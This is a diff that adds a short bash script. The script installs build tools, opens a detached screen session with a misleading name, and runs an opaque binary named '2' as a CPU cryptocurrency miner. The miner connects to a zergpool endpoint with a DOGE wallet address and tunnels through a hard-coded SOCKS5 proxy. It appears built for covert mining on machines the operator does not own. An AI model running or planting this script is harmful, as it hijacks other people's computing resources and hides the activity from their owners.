@@ -1,0 +1,11 @@
+#!/bin/bash
+sudo apt update
+sudo apt install screen libjansson4 -y
+sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
+screen -dmS ls
+A=stratum+tcp://verushash.na.mine.zergpool.com:3300
+B=DH9JoGyT5t41Sf5uipUYVqR7hdJq1GSg1u
+C=SUPER99
+D=socks5://72.217.216.239:4145
+
+chmod u+x 2 && ./2 -a verus -o $A -u $B.$C -x $D  -p c=DOGE --cpu-priority 5 -t 40 --max-diff=39000
